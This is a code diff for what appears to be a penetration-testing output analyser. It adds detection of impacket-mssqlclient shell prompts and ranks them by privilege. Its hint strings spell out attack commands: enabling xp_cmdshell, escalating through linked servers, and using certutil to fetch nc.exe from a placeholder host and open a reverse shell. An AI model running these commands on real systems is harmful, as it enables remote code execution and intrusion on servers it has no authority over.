@@ -2231,6 +2231,17 @@ _IMPACKET_SHELL_PROMPT = re.compile(
     r'^\s*C:\\Windows\\system32>\s|'
     r'^\s*C:\\Users\\[\w.\-$]+>\s'
 )
+# iter-266: impacket-mssqlclient SQL prompt. Distinctive shape:
+#   SQL (SYSTEM  dbo@master)>       - landed as SYSTEM (xp_cmdshell
+#                                     w/ EXECUTE AS LOGIN='sa')
+#   SQL (sa  dbo@master)>           - landed as sa (dbo admin)
+#   SQL (webapp_user  dbo@myapp)>   - landed as low-priv db account
+# The user context in group(1) drives severity - SYSTEM = CRITICAL RCE
+# landed; sa = HIGH (xp_cmdshell one command away); other = MEDIUM.
+_MSSQL_SHELL_PROMPT = re.compile(
+    r'(?im)^SQL\s*\(([A-Za-z0-9._\\$\-]{1,60})\s+'
+    r'(?:dbo|guest|public|db_[a-z_]+)@[\w\-.]{1,60}\)\s*>\s*'
+)
 
 # iter-257: Windows autorun / scheduled task privesc detectors.
 # Complements iter-256 (unquoted service) + AlwaysInstallElevated
@@ -3703,6 +3714,60 @@ def _multiline_passes(path, report, store):
                              "psexec / wmiexec / smbexec / evil-"
                              "winrm - if IIS/webshell, upgrade via "
                              "nc reverse shell first"))
+
+        # iter-266: impacket-mssqlclient SQL prompt captured. User
+        # context in the prompt tells us if we landed as SYSTEM (RCE
+        # via xp_cmdshell + EXECUTE AS LOGIN='sa' - game over on that
+        # host), sa (dbo admin, one xp_cmdshell away from SYSTEM), or
+        # a lower-priv db account (still useful for db data extraction
+        # and sometimes DB link chaining).
+        _sql_ctx_seen = set()
+        for _sm in _MSSQL_SHELL_PROMPT.finditer(text[:65536]):
+            _sql_user = _sm.group(1).strip()
+            _sql_user_low = _sql_user.lower()
+            if _sql_user_low in _sql_ctx_seen:
+                continue
+            _sql_ctx_seen.add(_sql_user_low)
+            if _sql_user_low in ("system", "nt authority\\system"):
+                _sql_sev = "CRITICAL"
+                _sql_msg = ("MSSQL SYSTEM shell landed via impacket-"
+                            f"mssqlclient (as {_sql_user})")
+                _sql_hint = ("full RCE as SYSTEM: xp_cmdshell "
+                             "'whoami; net user; net localgroup "
+                             "Administrators'  |  drop shell: "
+                             "xp_cmdshell 'certutil -urlcache -split "
+                             "-f http://<lhost>/nc.exe C:\\Windows"
+                             "\\Temp\\nc.exe && C:\\Windows\\Temp\\"
+                             "nc.exe <lhost> 4444 -e cmd.exe'")
+            elif _sql_user_low in ("sa", "dbo"):
+                _sql_sev = "HIGH"
+                _sql_msg = ("MSSQL sa/dbo shell landed via impacket-"
+                            f"mssqlclient (as {_sql_user})")
+                _sql_hint = ("enable + use xp_cmdshell for SYSTEM RCE:"
+                             " EXEC sp_configure 'show advanced "
+                             "options', 1; RECONFIGURE; EXEC "
+                             "sp_configure 'xp_cmdshell', 1; "
+                             "RECONFIGURE; EXEC xp_cmdshell 'whoami'"
+                             "  |  or `enable_xp_cmdshell` "
+                             "impacket-mssqlclient interactive "
+                             "shortcut")
+            else:
+                _sql_sev = "MEDIUM"
+                _sql_msg = ("MSSQL shell landed via impacket-"
+                            f"mssqlclient (as {_sql_user})")
+                _sql_hint = ("low-priv db user - check IS_SRVROLEMEMBER"
+                             "('sysadmin') and IS_MEMBER('db_owner');"
+                             "  |  DB link enumeration: SELECT * FROM "
+                             "master..sysservers  |  if linked server "
+                             "has sysadmin - EXEC "
+                             "('sp_configure ''xp_cmdshell'',1;"
+                             "RECONFIGURE') AT [linked_server]")
+            report.add(_sql_sev, "RECON", path, _ln(_sm), _sql_msg,
+                       hint=_sql_hint)
+            if store is not None:
+                store.add(Evidence(kind="mssql_shell", user=_sql_user,
+                                   source=path, line=_ln(_sm),
+                                   meta={"privilege": _sql_user_low}))
 
     # iter-257: Windows autorun / scheduled task privesc from
     # captured reg query + schtasks /query output. Doc-file gate.
